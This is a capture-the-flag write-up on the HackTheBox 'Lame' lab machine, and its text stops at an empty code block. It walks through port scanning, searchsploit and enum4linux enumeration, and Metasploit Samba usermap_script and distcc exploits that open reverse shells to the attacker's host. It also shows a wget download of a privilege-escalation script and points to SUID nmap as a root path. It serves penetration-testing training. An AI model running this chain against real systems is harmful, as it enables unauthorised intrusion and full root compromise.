# Hackthebox Lame

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

## Recon

First we do our standard portscanning of every tcp port on the system.

```
nmap -v -sV -p- 10.10.10.3

Nmap scan report for 10.10.10.3
Host is up (0.072s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

If we were to run a normal scan of the top 1000 nmap ports, we would not have seen the distcc service on port 3632.

Mapping these enumerated services against known exploits gives us the following results.


```
root@kali:~/htb/lame# searchsploit --nmap lame_full.xml 
[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
[i] Reading: 'lame_full.xml'

[i] /usr/bin/searchsploit -t vsftpd 2 3 4
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t openssh 4 7p1 debian 8ubuntu1
[i] /usr/bin/searchsploit -t samba smbd 3 x   4 x
[i] /usr/bin/searchsploit -t distccd v1
```
Nothing much. But if we add the -v flag to searchsploit we get a little more to work with.

```
root@kali:~/htb/lame# searchsploit --nmap -v lame_full.xml 
[i] Reading: 'lame_full.xml'

[i] /usr/bin/searchsploit -t vsftpd 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                              | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                              | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                              | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                            | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t vsftpd 2 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                              | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                              | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                              | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                            | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t vsftpd 2 3 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.3.2 - Denial of Service                                                                                                                            | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t vsftpd 2 3 4 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t openssh 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                                                        | exploits/linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                                                          | exploits/multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                                                            | exploits/freebsd/remote/17462.txt
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                          | exploits/novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                                  | exploits/linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                    | exploits/linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                              | exploits/linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                           | exploits/unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                                  | exploits/linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                        | exploits/unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                        | exploits/unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                                                                  | exploits/multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                                                        | exploits/linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                                                             | exploits/linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                     | exploits/multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                        | exploits/linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                | exploits/linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                      | exploits/linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                        | exploits/linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                    | exploits/linux/remote/40963.txt
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                         | exploits/linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                           | exploits/linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                       | exploits/linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                        | exploits/multiple/remote/3303.sh
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                                                      | exploits/linux/local/258.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t openssh 4 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                                  | exploits/linux/remote/21402.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                                                                  | exploits/multiple/dos/2444.sh
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                | exploits/linux_x86-64/remote/45000.c
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                        | exploits/linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                    | exploits/linux/remote/40963.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                        | exploits/multiple/remote/3303.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result


[i] /usr/bin/searchsploit -t openssh 4 7p1 

[i] /usr/bin/searchsploit -t samba 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                              | exploits/php/webapps/4575.txt
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                                                             | exploits/windows/dos/148.sh
SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                                                             | exploits/cgi/webapps/17577.txt
Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                                                            | exploits/linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                                                                                                                      | exploits/linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                                                                                                                          | exploits/unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                                                                                                              | exploits/linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                                                                                                              | exploits/linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link                                                                                                               | exploits/linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                   | exploits/unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                | exploits/osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                     | exploits/linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                           | exploits/bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                             | exploits/linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                         | exploits/linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                           | exploits/osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                     | exploits/solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                   | exploits/linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                  | exploits/unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                  | exploits/unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                  | exploits/unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                  | exploits/unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                        | exploits/linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                     | exploits/unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                                                        | exploits/linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                        | exploits/osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                      | exploits/multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                            | exploits/unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                          | exploits/linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                      | exploits/linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                    | exploits/solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                    | exploits/linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                           | exploits/multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                            | exploits/linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                     | exploits/linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                                               | exploits/linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                 | exploits/linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                   | exploits/linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                      | exploits/linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                       | exploits/linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                                         | exploits/linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                | exploits/linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                  | exploits/linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                  | exploits/linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                                                    | exploits/multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                                                                                                                              | exploits/linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                           | exploits/multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                       | exploits/linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                               | exploits/linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                                                     | exploits/windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                                                       | exploits/cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                                        | exploits/windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                   | exploits/windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                                          | exploits/multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                                                | exploits/multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service                                                                                                         | exploits/windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure                                                                                                                | exploits/cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting                                                                                                      | exploits/windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                                                                                                                  | exploits/windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass                                                                                                      | exploits/windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                                                    | exploits/windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting                                                                                             | exploits/windows/remote/25696.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Scripting                                                                                          | exploits/windows/remote/25695.txt
Sambar Server 6 - Search Results Buffer Overflow (Metasploit)                                                                                               | exploits/windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                                                      | exploits/windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting                                                                                             | exploits/windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                              | exploits/windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting                                                                                        | exploits/windows/remote/24162.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

[i] /usr/bin/searchsploit -t samba smbd 

[i] /usr/bin/searchsploit -t distccd 
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                                                              |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
DistCC Daemon - Command Execution (Metasploit)                                                                                                              | exploits/multiple/remote/9915.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

So let's walk through the services and check the known exploits.


### vsftpd 2.3.4

According to the version there should be a Command Execution vulnerability on this service in the forms of a backdoor. 

After messing with this for quite a while it seems that this is in fact not vulnerable. This could be ań intentional rabbit hole by the author of this box.


### OpenSSH 4.7p1 Debian 8ubuntu1

The running SSH version is vuknerable to a username enumeration issue.

We can run the metasploit module "ssh_enumusers" with a supplied wordlist to enumerate some valid users on the system.

```
msf auxiliary(scanner/ssh/ssh_enumusers) > run                                                                                                                                                       
                                                                                                                                                                                                     
[*] 10.10.10.3:22 - SSH - Using malformed packet technique                                                                                                                                           
[*] 10.10.10.3:22 - SSH - Checking for false positives                                                                                                                                               
[*] 10.10.10.3:22 - SSH - Starting scan 

[+] 10.10.10.3:22 - SSH - User 'daemon' found                                                                                                                                                        
[+] 10.10.10.3:22 - SSH - User 'ftp' found
[+] 10.10.10.3:22 - SSH - User 'irc' found
[+] 10.10.10.3:22 - SSH - User 'mail' found
[+] 10.10.10.3:22 - SSH - User 'nobody' found
[+] 10.10.10.3:22 - SSH - User 'sshd' found
[+] 10.10.10.3:22 - SSH - User 'sys' found
[+] 10.10.10.3:22 - SSH - User 'uucp' found

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

No really interesting user was found, but we could expand on this later with at better wordlist if we get stuck. Enumerate users and the try to brute-force their SSH login a possible attack vector.

### Samba

Next in our list is Samba. Samba has a history of serious bugs. The first thing i usually check is if we can leverage nullsessions to get any information about the system.

The next thing I generally look for is if there are any shares accessible.

Scanning the box with enum4linux we find that we can actually use nullsessions. It also seems to be a share called "tmp" that we can list contents.

```
root@kali:~/htb/lame# enum4linux 10.10.10.3                                         
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  9 13:32:46 2018                                                                                     
                                                                                                        
 ==========================                                                                                                                                                                         
|    Target Information    |                                                                            
 ==========================                                                                                                                                                                         
Target ........... 10.10.10.3                                                                           
RID Range ........ 500-550,1000-1050                                                                                                                                                                
Username ......... ''                                                                                   
Password ......... ''                                                                                                                                                                               
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  

 ===================================                                                                                                                                                                
|    Session Check on 10.10.10.3    |                                               
 ===================================                                                                                                                                                                
[+] Server 10.10.10.3 allows sessions using username '', password ''                                                                                                                                
[+] Got domain/workgroup name:      

 ====================================                                                                   
|    OS information on 10.10.10.3    |                                                                  
 ====================================                                                                   
[+] Got OS info for 10.10.10.3 from smbclient:
[+] Got OS info for 10.10.10.3 from srvinfo:
        LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03

 ===========================
|    Users on 10.10.10.3    |
 ===========================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =======================================
|    Share Enumeration on 10.10.10.3    |
 =======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

[+] Attempting to map shares on 10.10.10.3
//10.10.10.3/print$     Mapping: DENIED, Listing: N/A
//10.10.10.3/tmp        Mapping: OK, Listing: OK
//10.10.10.3/opt        Mapping: DENIED, Listing: N/A
//10.10.10.3/IPC$       [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//10.10.10.3/ADMIN$     Mapping: DENIED, Listing: N/A
       
 ==================================================                                                                                                                                                  
|    Password Policy Information for 10.10.10.3    |                                                                                                                                                 
 ==================================================                                                                                                                                                  


[+] Attaching to 10.10.10.3 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] LAME
        [+] Builtin

[+] Password Info for Domain: LAME

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


```

## Initial Compromise

The enum4linux script reveals that the Samba version is "3.0.20-Debian". If we go back to searchsploit we see that there is a exploit "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)" that should work on this system.

Let's fire up Metasploit and try it out.


```
msf exploit(multi/samba/usermap_script) > exploit 

[*] Started reverse TCP double handler on 10.10.14.17:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo JhQichFjwuEPScCt;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "JhQichFjwuEPScCt\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:49409) at 2018-11-22 23:08:07 +0100

id
uid=0(root) gid=0(root)
```

Bingo, the samba service is running as root and therefore we get a root shell on the box.


There is the distcc service that we also may check out.

The Searchsploit output also showed that there is a potential distcc exploit that also micht work. It is also an Metasploit module.

```
msf exploit(unix/misc/distcc_exec) > exploit 

[*] Started reverse TCP double handler on 10.10.14.17:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo NuXccoOU1P0JeS8D;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "NuXccoOU1P0JeS8D\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.14.17:4444 -> 10.10.10.3:40442) at 2018-11-22 23:13:28 +0100

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Sweet we have another shell. This one however is not root. Time to privesc!S


## Privilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

So first I download a privesc script call LinEnum on the /dev/shm location.

```
daemon@lame:/dev/shm$ wget http://10.10.14.17:8000/LinEnum.sh
wget http://10.10.14.17:8000/LinEnum.sh
--14:19:48--  http://10.10.14.17:8000/LinEnum.sh
           => `LinEnum.sh'
Connecting to 10.10.14.17:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47,066 (46K) [text/x-sh]

100%[====================================>] 47,066       114.14K/s

14:19:49 (113.90 KB/s) - `LinEnum.sh' saved [47066/47066]
```

Running the scrip and going through it's output I note the following

```
[+] Possibly interesting SUID files:                     
-rwsr-xr-- 1 root dhcp 2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
-rwsr-xr-x 1 root root 165748 Apr  6  2008 /usr/lib/openssh/ssh-keysign
```

So we have nmap installed and it has the SUID bit set. So this means that we can run nmap in interactive mode and spawn a shell that will be running as the owner of the file, namely root. 

```
